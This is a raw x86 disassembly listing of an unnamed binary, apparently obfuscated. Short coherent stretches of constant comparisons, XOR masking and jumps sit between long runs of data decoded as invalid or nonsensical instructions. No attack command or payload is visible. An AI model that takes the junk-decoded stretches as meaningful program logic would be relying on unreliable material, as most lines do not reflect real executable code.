  41b674:	test   DWORD PTR [ebx+0x646415bc],esp
  41b67a:	(bad)  
  41b67b:	loope  0x41b618
  41b67d:	pop    ebp
  41b67e:	lock (bad) 
  41b680:	(bad)  
  41b681:	les    edi,FWORD PTR [ebx+0x2429eab6]
  41b687:	add    eax,0xaf2ec471
  41b68c:	or     BYTE PTR [edx+0x7dc35dcd],dl
  41b692:	add    eax,ebp
  41b694:	xor    DWORD PTR [esi+0x3c],edx
  41b697:	stc    
  41b698:	loop   0x41b68c
  41b69a:	jmp    esp
  41b69c:	dec    BYTE PTR [esi-0x73e0fc64]
  41b6a2:	scas   al,BYTE PTR es:[edi]
  41b6a3:	jns    0x41b722
  41b6a5:	ja     0x41b648
  41b6a7:	and    DWORD PTR [esi-0x25],ecx
  41b6aa:	adc    ch,ah
  41b6ac:	xchg   DWORD PTR [eax-0x21085188],ebp
  41b6b2:	rcr    DWORD PTR [eax-0x4d92c333],cl
  41b6b8:	aas    
  41b6b9:	lahf   
  41b6ba:	stos   DWORD PTR es:[edi],eax
  41b6bb:	and    eax,0x52b092e1
  41b6c0:	mov    ch,0xcc
  41b6c2:	sti    
  41b6c3:	mov    eax,ds:0xaad1c939
  41b6c8:	push   0x4d544c3c
  41b6cd:	in     eax,dx
  41b6ce:	mov    dh,0xb0
  41b6d0:	in     al,dx
  41b6d1:	cwde   
  41b6d2:	addr16 stc 
  41b6d4:	ins    DWORD PTR es:[edi],dx
  41b6d5:	jmp    0x41b71e
  41b6d7:	pop    edx
  41b6d8:	ret    
  41b6d9:	xor    ch,BYTE PTR [ecx+esi*4+0x23]
  41b6dd:	and    al,0x9e
  41b6df:	mov    esp,0x6134bc05
  41b6e4:	mov    dl,0xb5
  41b6e7:	cli    
  41b6e8:	sbb    eax,0x6be48f1f
  41b6ed:	in     al,dx
  41b6ee:	mov    bh,0x84
  41b6f0:	add    DWORD PTR [edx-0x63],esi
  41b6f3:	pop    ecx
  41b6f4:	mov    al,0xf
  41b6f6:	jmp    0x254c4183
  41b6fb:	nop
  41b6fc:	mov    bh,0x0
  41b6fe:	push   cs
  41b6ff:	add    BYTE PTR [edi],0x5
  41b702:	or     al,0x8c
  41b704:	adc    ecx,ebx
  41b706:	and    DWORD PTR [esi-0x691d8fe8],edx
  41b70c:	xchg   ebp,eax
  41b70d:	gs (bad) 
  41b710:	sbb    esp,DWORD PTR [ebp-0x2a]
  41b713:	jmp    0x63d6:0x4151e300
  41b71a:	popa   
  41b71b:	cmp    DWORD PTR [eax+0x7e],edi
  41b71e:	repnz in al,dx
  41b720:	ss addr16 push esi
  41b723:	outs   dx,BYTE PTR ds:[esi]
  41b724:	inc    ebp
  41b725:	shl    eax,0x1e
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x422644
  41b758:	mov    DWORD PTR [esp+0x68],0x42263c
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x4225cc
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx+0x30aa298c],dh
  41b815:	out    0xa9,al
  41b817:	mov    esp,0x1816895e
  41b81c:	mov    esp,0x21181812
  41b821:	es push eax
  41b823:	loope  0x41b873
  41b825:	jg     0x41b841
  41b827:	ins    DWORD PTR es:[edi],dx
  41b828:	iret   
  41b829:	scas   al,BYTE PTR es:[edi]
  41b82a:	out    dx,eax
  41b82b:	jp     0x41b890
  41b82d:	mov    WORD PTR [eax-0x6c],?
  41b830:	aad    0x8d
  41b832:	sub    eax,ebx
  41b834:	or     eax,0x7ed37042
  41b839:	mov    ch,0xb8
  41b83b:	sbb    eax,DWORD PTR [ebx+ebx*1-0x2c]
  41b83f:	mov    ds:0x48fbf447,al
  41b844:	mov    dl,0xe4
  41b846:	and    eax,0x2ac2192a
  41b84b:	adc    dh,dh
  41b84d:	cmp    esi,ebx
  41b84f:	out    dx,eax
  41b850:	add    al,0x77
  41b852:	iret   
  41b853:	jne    0x41b7d5
  41b855:	xor    al,0x62
  41b857:	clc    
  41b858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b859:	scas   eax,DWORD PTR es:[edi]
  41b85a:	cmp    eax,0x624f8f75
  41b85f:	and    edi,DWORD PTR [edi+0x6034cb9]
  41b865:	inc    esi
  41b866:	push   esi
  41b867:	inc    esi
  41b868:	push   edx
  41b869:	in     al,0x6c
  41b86b:	sbb    ah,BYTE PTR [eax+0x593484ff]
  41b871:	fisttp WORD PTR [edi-0x17463188]
  41b877:	mov    bl,0xe4
  41b879:	push   ebx
  41b87a:	clc    
  41b87b:	lea    ebp,[edx+0x6604c4b1]
  41b881:	pop    ebp
  41b882:	jns    0x41b869
  41b884:	sbb    al,0x71
  41b886:	sub    DWORD PTR [edi],0x43e961ba
  41b88c:	out    0x4,eax
  41b88e:	sti    
  41b88f:	pop    edx
  41b890:	mov    ah,0x98
  41b892:	stos   BYTE PTR es:[edi],al
  41b893:	nop
  41b894:	int3   
  41b895:	dec    edi
  41b896:	cdq    
  41b897:	call   FWORD PTR [esi-0x5bac1ecf]
  41b89d:	jb     0x41b8b4
  41b89f:	out    0xa2,eax
  41b8a1:	xchg   esi,eax
  41b8a2:	aaa    
  41b8a3:	xor    al,0x39
  41b8a5:	lods   eax,DWORD PTR ds:[esi]
  41b8a6:	mov    eax,DWORD PTR [ebp-0x9]
  41b8a9:	inc    esp
  41b8aa:	fisub  DWORD PTR [esi]
  41b8ac:	fs in  eax,dx
  41b8ae:	imul   edi,ecx,0x74
  41b8b1:	adc    edx,DWORD PTR [esp+eax*2-0x54]
  41b8b5:	scas   eax,DWORD PTR es:[edi]
  41b8b6:	and    ch,BYTE PTR [eax]
  41b8b8:	loope  0x41b8b4
  41b8ba:	ja     0x41b932
  41b8bc:	test   DWORD PTR [edi+0x73961448],ebp
  41b8c2:	mov    esi,0x9f876601
  41b8c7:	inc    edi
  41b8c8:	nop
  41b8c9:	lds    edi,FWORD PTR [eax+0x6c6ccf11]
  41b8cf:	(bad)  
  41b8d0:	(bad)  
  41b8d2:	pop    ebx
  41b8d3:	jge    0x41b86f
  41b8d5:	push   ss
  41b8d6:	jno    0x41b93f
  41b8d8:	je     0x41b94f
  41b8da:	or     DWORD PTR [edi-0x304f8cf1],ecx
  41b8e0:	loope  0x41b95d
  41b8e2:	dec    ebp
  41b8e3:	pop    edi
  41b8e4:	popa   
  41b8e5:	and    al,0x10
  41b8e7:	cmp    cl,ch
  41b8e9:	inc    DWORD PTR [ecx-0x37]
  41b8ec:	loop   0x41b88e
  41b8ee:	loope  0x41b911
  41b8f0:	jle    0x41b886
  41b8f2:	mov    eax,0x4a4d12c4
  41b8f7:	bound  ecx,QWORD PTR [ecx+0x4]
  41b8fa:	pusha  
  41b8fb:	iret   
  41b8fc:	addr16 dec edi
  41b8fe:	mov    eax,ss:0x6e3f253a
  41b904:	dec    esi
  41b905:	(bad)  
  41b906:	neg    BYTE PTR [edx+0xe]
  41b909:	bound  esp,QWORD PTR [ecx-0x4c6e3824]
  41b90f:	pop    ebx
  41b910:	ins    DWORD PTR es:[edi],dx
  41b911:	pop    esp
  41b912:	ret    0x97ad
  41b915:	out    dx,eax
  41b916:	mov    ebp,0x54e7fcd1
  41b91b:	pop    ds
  41b91c:	pop    esi
  41b91d:	arpl   WORD PTR [edi-0x25],cx
  41b920:	out    0xd7,al
  41b922:	ss jo  0x41b963
  41b925:	popf   
  41b926:	push   0x5
  41b928:	and    al,0xfb
  41b92a:	in     eax,dx
  41b92b:	in     eax,0x86
  41b92d:	jecxz  0x41b944
  41b92f:	jo     0x41b913
  41b931:	push   ebp
  41b932:	add    eax,0x6f6bd0c6
  41b937:	shl    al,1
  41b939:	int    0xa2
  41b93b:	dec    edi
  41b93c:	mov    DWORD PTR [esp+eiz*2+0x51],edx
  41b940:	rol    DWORD PTR [eax-0xb49aa3f],cl
  41b946:	nop
  41b947:	push   0xffffff9d
  41b949:	out    dx,al
  41b94a:	cdq    
  41b94b:	je     0x41b905
  41b94d:	xor    DWORD PTR [ebp-0x33],0x4c
  41b951:	pushf  
  41b952:	cld    
  41b953:	je     0x41b968
  41b955:	fnstcw WORD PTR [ecx-0x40]
  41b958:	sbb    eax,0x41a1fa9b
  41b95d:	test   BYTE PTR [edi+0x7edc27b1],ah
  41b963:	into   
  41b964:	ficom  DWORD PTR [eax]
  41b966:	sbb    ebp,DWORD PTR [ecx-0x68]
  41b969:	fsubr  DWORD PTR [edx+0x4a]
  41b96d:	shr    edx,1
  41b96f:	adc    al,0xa0
  41b971:	sub    edx,esp
  41b973:	xor    cl,BYTE PTR [ecx+0x2a2596cf]
  41b979:	rcl    BYTE PTR [ebp-0x22],1
  41b97c:	scas   al,BYTE PTR es:[edi]
  41b97d:	mov    DWORD PTR [ecx+0x32],edi
  41b980:	add    al,0x11
  41b982:	pop    ss
  41b983:	mov    ds:0x5c75ca53,eax
  41b988:	push   ebp
  41b989:	(bad)  
  41b98b:	sbb    al,0x8d
  41b98d:	(bad)  
  41b98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b98f:	mov    ecx,DWORD PTR [edx+0x2]
  41b992:	int3   
  41b993:	in     eax,dx
  41b994:	in     al,0x40
  41b996:	jl     0x41b9ef
  41b998:	cwde   
  41b999:	dec    edx
  41b99a:	push   ebp
  41b99b:	ror    DWORD PTR cs:[eax+ecx*8+0x3a4b2e50],cl
  41b9a3:	call   0x3586:0x8ca4dd78
  41b9aa:	imul   esp,ebx,0x5b1ae6e9
  41b9b0:	sub    dl,bl
  41b9b2:	jne    0x41b966
  41b9b4:	pop    esp
  41b9b5:	mov    esi,eax
  41b9b7:	hlt    
  41b9b8:	adc    edi,DWORD PTR [esi-0x1e]
  41b9bb:	ds pop edi
  41b9bd:	lods   al,BYTE PTR ds:[esi]
  41b9be:	(bad)  
  41b9bf:	bound  edx,QWORD PTR [eiz*4+0x10893105]
  41b9c6:	add    DWORD PTR [edi+0x5431dd4a],edx
  41b9cc:	xor    al,BYTE PTR [edi-0xc]
  41b9cf:	int    0xab
  41b9d1:	bound  eax,QWORD PTR [edx+0x74]
  41b9d4:	es loop 0x41b9cb
  41b9d7:	push   ebp
  41b9d8:	sub    ch,BYTE PTR [esi]
  41b9da:	dec    esi
  41b9db:	mov    esp,0xf84a6c3a
  41b9e0:	xchg   ebx,eax
  41b9e1:	repnz add dh,BYTE PTR [edx+eiz*2-0x20]
  41b9e6:	xor    DWORD PTR [esi-0x3c17f40],edi
  41b9ec:	out    0x26,al
  41b9ee:	cmp    ah,dh
  41b9f0:	scas   eax,DWORD PTR es:[edi]
  41b9f1:	stos   DWORD PTR es:[edi],eax
  41b9f2:	aam    0x88
  41b9f4:	repnz addr16 mov esp,0x803f17be
  41b9fb:	adc    bl,BYTE PTR [ebp-0x5bbedee8]
  41ba01:	jnp    0x41ba74
  41ba03:	or     eax,0xfc4f86f
  41ba08:	cmp    BYTE PTR [esp+eax*2-0x50],dl
  41ba0c:	mov    dh,0xc5
  41ba0e:	je     0x41ba17
  41ba10:	mov    bh,0x3b
  41ba12:	pop    ds
  41ba13:	aad    0x17
  41ba15:	xor    al,0x51
  41ba17:	jo     0x41ba10
  41ba19:	popa   
  41ba1a:	dec    esp
  41ba1b:	adc    al,0xae
  41ba1d:	dec    ebx
  41ba1e:	jbe    0x1ca89cc7
  41ba24:	sub    eax,0x83f17898
  41ba29:	imul   esi,ebp,0x46
  41ba2c:	retf   
  41ba2d:	cmp    BYTE PTR [ecx+0x33],0x81
  41ba31:	repnz bound eax,QWORD PTR [ebx]
  41ba34:	popa   
  41ba35:	mov    edi,0x9a221b95
  41ba3a:	hlt    
  41ba3b:	cmp    BYTE PTR [edx-0x38],bl
  41ba3e:	add    eax,0xf15caad5
  41ba43:	xchg   ecx,eax
  41ba44:	(bad)  
  41ba45:	mov    edi,0x4872b243
  41ba4a:	xlat   BYTE PTR ds:[ebx]
  41ba4b:	adc    DWORD PTR [ecx-0x7601377c],0xffffffd4
  41ba52:	test   esp,edx
  41ba54:	or     eax,ecx
  41ba56:	adc    ah,BYTE PTR [esi-0x34]
  41ba59:	push   ss
  41ba5a:	dec    ebp
  41ba5b:	in     al,dx
  41ba5c:	fcmovnb st,st(0)
  41ba5e:	inc    esi
  41ba5f:	dec    ebp
  41ba60:	test   eax,0x344911f5
  41ba65:	into   
  41ba66:	loop   0x41b9f2
  41ba68:	(bad)  
  41ba69:	xor    al,0x26
  41ba6b:	in     eax,0x99
  41ba6d:	and    eax,0xcba76399
  41ba72:	push   ss
  41ba73:	sbb    eax,0xd20b6100
  41ba78:	xchg   ecx,eax
  41ba79:	xor    DWORD PTR [ebp-0x4a9052f8],0x9ed81375
  41ba83:	scas   eax,DWORD PTR es:[edi]
  41ba84:	ficom  WORD PTR [eax-0x75]
  41ba87:	inc    esp
  41ba88:	cmp    DWORD PTR [edx+0x68],esp
  41ba8b:	test   DWORD PTR [ecx-0x7b],edi
  41ba8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba8f:	push   ebx
  41ba90:	add    al,0xf7
  41ba92:	dec    ebp
  41ba93:	add    bh,BYTE PTR [edx+0x1f]
  41ba96:	or     ebx,DWORD PTR [ebp-0xa]
  41ba99:	sub    ebx,edi
  41ba9b:	inc    edi
  41ba9c:	sub    al,0x7c
  41ba9e:	inc    edx
  41ba9f:	nop
  41baa0:	jecxz  0x41ba23
  41baa2:	call   0x92f27de2
  41baa7:	or     edx,esp
  41baa9:	jmp    0xfd72:0x2a7ae245
  41bab0:	xchg   ebx,eax
  41bab1:	push   edx
  41bab2:	imul   edx,eax,0xa454df5f
  41bab8:	dec    DWORD PTR [edi-0x466ed4c8]
  41babe:	push   ss
  41babf:	popf   
  41bac0:	mov    ebx,0x4b900b29
  41bac5:	pop    esp
  41bac6:	add    BYTE PTR [esi-0x2c1e92f9],al
  41bacc:	rcr    DWORD PTR [eax],1
  41bace:	adc    ebp,eax
  41bad0:	jb     0x41ba9b
  41bad2:	mov    bl,0xd0
  41bad4:	jl     0x41ba98
  41bad6:	xchg   BYTE PTR [eax],dh
  41bad8:	mov    esi,0x525149d3
  41badd:	mov    al,0xa6
  41badf:	mov    ?,WORD PTR [esi]
  41bae1:	in     al,dx
  41bae2:	pop    esp
  41bae3:	mov    ds:0x743271b6,eax
  41bae8:	nop
  41bae9:	(bad)  
  41baea:	mov    ch,0xc4
  41baec:	pop    edi
  41baed:	inc    esi
  41baee:	sti    
  41baef:	jge    0x41bb26
  41baf1:	xor    ebx,DWORD PTR [esi+0x5d]
  41baf4:	jne    0x41ba9c
  41baf6:	enter  0x4ebd,0x28
  41bafa:	pop    ecx
  41bafb:	mov    ch,0x4b
  41bafd:	shl    BYTE PTR [ecx+0x31],cl
  41bb00:	adc    esp,DWORD PTR [esi+0x40]
  41bb03:	mov    esi,0x46eb646
  41bb08:	push   esi
  41bb09:	nop
  41bb0a:	jecxz  0x41baf1
  41bb0c:	mov    esp,0x61889cb
  41bb11:	add    eax,0xb5d72577
  41bb16:	test   ecx,0x90589b7
  41bb1c:	inc    eax
  41bb1d:	jmp    0x197:0xcdd6fda8
  41bb24:	data16 rol BYTE PTR [ebp+0x7],cl
  41bb28:	push   esi
  41bb29:	mov    eax,fs
  41bb2b:	ss ins BYTE PTR es:[edi],dx
  41bb2d:	cmp    BYTE PTR [ecx],0x5c
  41bb30:	into   
  41bb31:	add    BYTE PTR [ebp-0x25fe9654],al
  41bb37:	sar    BYTE PTR [ecx],cl
  41bb39:	mov    dh,0xcb
  41bb3b:	xchg   DWORD PTR [edx],ebp
  41bb3d:	ss fs inc BYTE PTR ss:[ebp+0xc92446b]
  41bb46:	pop    edx
  41bb47:	sbb    BYTE PTR [edx],dh
  41bb49:	mov    bh,0xd4
  41bb4b:	popf   
  41bb4c:	out    0x81,eax
  41bb4e:	lods   eax,DWORD PTR ds:[esi]
  41bb4f:	and    esi,DWORD PTR [ebx-0x6]
  41bb52:	ja     0x41bb47
  41bb54:	enter  0xad8a,0xe
  41bb58:	je     0x41bbbe
  41bb5a:	adc    dh,BYTE PTR [edx+0x5]
  41bb5d:	xor    esi,ebp
  41bb5f:	mov    dl,0xa6
  41bb61:	rcl    BYTE PTR [eax-0x6f7864ce],cl
  41bb67:	mov    ds:0x4ea742a4,eax
  41bb6c:	jo     0x41bb67
  41bb6e:	out    0xf,eax
  41bb70:	adc    al,0x96
  41bb72:	xor    esp,DWORD PTR [ebx]
  41bb74:	push   cs
  41bb75:	adc    eax,0xebaec75f
  41bb7a:	dec    esp
  41bb7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb7c:	(bad)  
  41bb7d:	mov    WORD PTR [edi-0x7d],cs
  41bb80:	out    dx,eax
  41bb81:	add    ecx,DWORD PTR [edx-0x4a63d8df]
  41bb87:	push   esp
  41bb88:	fnstenv [esi+0x6e]
  41bb8b:	mov    esi,0x4e260f7b
  41bb90:	shl    BYTE PTR [esi-0x7e96d110],1
  41bb96:	ss cmp al,0x16
  41bb99:	ret    
  41bb9a:	sub    bl,cl
  41bb9c:	inc    ecx
  41bb9d:	push   ebx
  41bb9e:	sbb    BYTE PTR [edi-0x7a4fbcca],al
  41bba4:	das    
  41bba5:	inc    ebp
  41bba6:	cmc    
  41bba7:	push   cs
  41bba8:	bound  edx,QWORD PTR [ecx+0x2cd25ed]
  41bbae:	jle    0x41bb4d
  41bbb0:	int3   
  41bbb1:	mov    al,ds:0x7ac975e4
  41bbb6:	cdq    
  41bbb7:	sub    BYTE PTR [ebx+0x52],dh
  41bbba:	mov    bh,0x93
  41bbbc:	out    dx,al
  41bbbd:	int3   
  41bbbe:	nop
  41bbbf:	cmp    eax,0x3fad1b71
  41bbc4:	xchg   esi,ebp
  41bbc6:	loopne 0x41bb56
  41bbc8:	or     DWORD PTR [esp+ecx*2],0x49153e3b
  41bbcf:	pop    ecx
  41bbd0:	mov    BYTE PTR [ebp+0x66],cl
  41bbd3:	and    ecx,edx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	int    0xf9
  41bc03:	dec    edi
  41bc04:	jle    0x41bc09
  41bc06:	adc    DWORD PTR [esi],0x1812bc18
  41bc0c:	sbb    BYTE PTR [edi-0x380806a4],ch
  41bc12:	push   ss
  41bc13:	mov    cs,WORD PTR [ebp+0x13]
  41bc16:	dec    esp
  41bc17:	and    al,0xd9
  41bc19:	aas    
  41bc1a:	mov    ebx,0x101094a6
  41bc1f:	xor    eax,0x1a4b6235
  41bc24:	dec    eax
  41bc25:	daa    
  41bc26:	dec    ebp
  41bc27:	dec    edi
  41bc28:	les    ebp,FWORD PTR [edx-0x64]
  41bc2b:	sub    al,0x16
  41bc2d:	dec    eax
  41bc2e:	loop   0x41bbfa
  41bc30:	jecxz  0x41bc6f
  41bc32:	dec    ecx
  41bc33:	sbb    DWORD PTR [esp+edi*2+0x53],ebx
  41bc37:	stos   BYTE PTR es:[edi],al
  41bc38:	add    al,0xb5
  41bc3a:	cli    
  41bc3b:	xor    BYTE PTR [edx+esi*4-0x14],dh
  41bc3f:	push   cs
  41bc40:	mov    dl,0xe
  41bc42:	retf   
  41bc43:	add    eax,0x75ede8ce
  41bc48:	push   ecx
  41bc49:	jne    0x41bc44
  41bc4b:	and    edi,DWORD PTR [eax]
  41bc4d:	inc    esi
  41bc4e:	or     ebp,DWORD PTR [ebx+0x167e7994]
  41bc54:	push   esi
  41bc55:	jge    0x41bbd8
  41bc57:	mov    esp,DWORD PTR [ebp-0x3e20d1f7]
  41bc5d:	cmp    edx,esp
  41bc5f:	push   0x175378cf
  41bc64:	lds    esi,FWORD PTR [edx-0x9]
  41bc67:	int    0x71
  41bc69:	icebp  
  41bc6a:	repnz or al,0x4a
  41bc6d:	imul   DWORD PTR [ecx+ecx*4]
  41bc70:	in     eax,0x23
  41bc72:	inc    esi
  41bc73:	popa   
  41bc74:	push   eax
  41bc75:	out    0x1b,al
  41bc77:	test   DWORD PTR [ebp+0x3e64c0aa],eax
  41bc7d:	adc    dh,BYTE PTR [ebx+ebx*2]
  41bc80:	push   0xffffffc7
  41bc82:	pop    ecx
  41bc83:	cmp    BYTE PTR [esp+ebx*1+0x388a8e91],dl
  41bc8a:	pusha  
  41bc8b:	pusha  
  41bc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc8d:	fmul   st,st(5)
  41bc8f:	and    eax,0xec4b66ac
  41bc94:	(bad)  
  41bc95:	sbb    esp,DWORD PTR [eax+0x496b81e6]
  41bc9b:	inc    eax
  41bc9c:	retf   0x8bc7
  41bc9f:	inc    esp
  41bca0:	shr    DWORD PTR [esi-0x2d],cl
  41bca3:	push   esi
  41bca4:	push   ebp
  41bca5:	add    eax,0xddecec7
  41bcaa:	jmp    0x50c6:0x63d92030
  41bcb1:	test   al,0xcc
  41bcb3:	mov    eax,ds:0x699b8917
  41bcb8:	mov    ecx,0x51d65b6b
  41bcbd:	dec    esp
  41bcbe:	fld    DWORD PTR [edi+0x4727ea4f]
  41bcc4:	mov    dh,0x32
  41bcc6:	mov    dl,0x47
  41bcc8:	push   esi
  41bcc9:	mov    esi,0x15bcd189
  41bcce:	out    0x2a,al
  41bcd0:	jae    0x41bca3
  41bcd2:	lods   eax,DWORD PTR ds:[esi]
  41bcd3:	cmp    DWORD PTR [edx+0x7a4d84ce],esi
  41bcd9:	in     eax,dx
  41bcda:	jnp    0x41bd21
  41bcdc:	call   0x69d2d144
  41bce1:	shr    BYTE PTR [edi],cl
  41bce3:	and    al,0x96
  41bce5:	in     al,0xef
  41bce7:	hlt    
  41bce8:	loop   0x41bccb
  41bcea:	and    DWORD PTR [esi+esi*4-0x3],eax
  41bcee:	mov    dh,0xe0
  41bcf0:	dec    edx
  41bcf1:	xchg   esp,eax
  41bcf2:	push   eax
  41bcf3:	dec    edi
  41bcf4:	pop    ds
  41bcf5:	jns    0x41bcf2
  41bcf7:	out    dx,eax
  41bcf8:	shr    DWORD PTR [bx+si-0x3b88],1
  41bcfd:	push   ebx
  41bcfe:	ins    DWORD PTR es:[edi],dx
  41bcff:	fstp   QWORD PTR [edx]
  41bd01:	(bad)  
  41bd02:	popa   
  41bd03:	das    
  41bd04:	aam    0xc9
  41bd06:	fsub   QWORD PTR [edx-0x69ca5763]
  41bd0c:	push   ebx
  41bd0d:	ins    DWORD PTR es:[edi],dx
  41bd0e:	enter  0x960f,0xc7
  41bd12:	xor    al,0xc0
  41bd14:	adc    BYTE PTR [eax],0x39
  41bd17:	(bad)
  41bd1b:	cli    
  41bd1c:	pop    es
  41bd1d:	sub    DWORD PTR ds:[ebp-0x6b],0xffffffe7
  41bd22:	dec    ebp
  41bd23:	mov    ds:0xe7c93b1a,al
  41bd28:	test   eax,0x85a34def
  41bd2d:	outs   dx,BYTE PTR ds:[esi]
  41bd2e:	sub    bh,BYTE PTR [esi]
  41bd30:	ins    DWORD PTR es:[edi],dx
  41bd31:	or     dl,dl
  41bd33:	inc    eax
  41bd34:	js     0x41bd17
  41bd36:	data16 std 
  41bd38:	mov    ebp,0x9400f0e3
  41bd3d:	call   0x3c43ca6e
  41bd42:	retf   0xd05e
  41bd45:	add    dh,BYTE PTR [ecx]
  41bd47:	adc    edx,DWORD PTR [edx]
  41bd49:	pop    ebp
  41bd4a:	add    al,BYTE PTR [esi-0x21]
  41bd4d:	lea    esi,[ebp+0x6d]
  41bd50:	pop    esp
  41bd51:	inc    ebp
  41bd52:	call   0x5e16dca4
  41bd57:	jp     0x41bcef
  41bd59:	in     al,0xd
  41bd5b:	ja     0x41bd8c
  41bd5d:	fisub  DWORD PTR [ecx+eiz*8-0x1f]
  41bd61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd62:	push   0x492ba688
  41bd67:	adc    al,0x61
  41bd69:	imul   eax,DWORD PTR [eax],0x3f
  41bd6c:	out    0x43,eax
  41bd6e:	ins    DWORD PTR es:[edi],dx
  41bd6f:	(bad)  
  41bd71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd72:	jmp    FWORD PTR [ecx]
  41bd74:	jle    0x41bda1
  41bd76:	jmp    0xe659a71b
  41bd7b:	stc    
  41bd7c:	jo     0x41bd21
  41bd7e:	jne    0x41bde7
  41bd80:	xor    al,0x73
  41bd82:	arpl   WORD PTR [esi],di
  41bd84:	sbb    al,0xd2
  41bd86:	mov    dh,0xf
  41bd88:	push   es
  41bd89:	or     dh,ah
  41bd8b:	enter  0x1b71,0x1
  41bd8f:	xor    DWORD PTR [ebx-0x20],ebx
  41bd92:	icebp  
  41bd93:	sbb    al,0x27
  41bd95:	jns    0x41bd66
  41bd97:	mov    dh,0x58
  41bd99:	loope  0x41bd86
  41bd9b:	(bad)  
  41bd9c:	sbb    ecx,DWORD PTR [edi+0x4f]
  41bd9f:	and    edi,DWORD PTR [ebx-0xcdedf75]
  41bda5:	pushf  
  41bda6:	xor    esp,DWORD PTR [ebp-0x445cf6e7]
  41bdac:	aas    
  41bdad:	dec    edx
  41bdae:	xchg   esp,eax
  41bdaf:	les    eax,FWORD PTR [esi+0x67]
  41bdb2:	mov    fs,WORD PTR [ebp+0x24]
  41bdb5:	popf   
  41bdb6:	pop    ebx
  41bdb7:	dec    esp
  41bdb8:	jb     0x41bdf1
  41bdba:	jmp    0x41bdd8
  41bdbc:	in     eax,dx
  41bdbd:	iret   
  41bdbe:	mov    edx,0x47c10baa
  41bdc3:	add    eax,0xfffd384f
  41bdc8:	mov    eax,0xd44c8071
  41bdcd:	out    0x8b,eax
  41bdcf:	push   0x7c1b3c87
  41bdd4:	scas   eax,DWORD PTR es:[edi]
  41bdd5:	test   BYTE PTR [ebx+eiz*8],cl
  41bdd8:	cmp    DWORD PTR [ebx-0x38],eax
  41bddb:	xchg   edi,eax
  41bddc:	push   cs
  41bddd:	lds    ecx,FWORD PTR [ecx-0xc1d95b]
  41bde3:	add    edi,DWORD PTR [esi+eiz*1+0x1c]
  41bde7:	sub    ecx,ecx
  41bde9:	pusha  
  41bdea:	sahf   
  41bdeb:	push   eax
  41bdec:	and    dl,BYTE PTR [ebx-0x52]
  41bdef:	push   0xffffffca
  41bdf1:	mov    ecx,0x4aa29fb
  41bdf6:	xchg   ebx,eax
  41bdf7:	jp     0x41be6e
  41bdf9:	pop    ecx
  41bdfa:	mov    ch,0x7f
  41bdfc:	dec    edi
  41bdfd:	pop    eax
  41bdfe:	(bad)  
  41bdff:	jl     0x41bd8f
  41be01:	or     DWORD PTR ds:0x6c9de46a,ebx
  41be07:	jge    0x41bdab
  41be09:	loop   0x41bdb8
  41be0b:	(bad)  
  41be0c:	into   
  41be0d:	sbb    al,0x95
  41be0f:	jns    0x41be1b
  41be11:	out    0x89,eax
  41be13:	cmp    BYTE PTR [esi-0x3f],cl
  41be16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be17:	push   ds
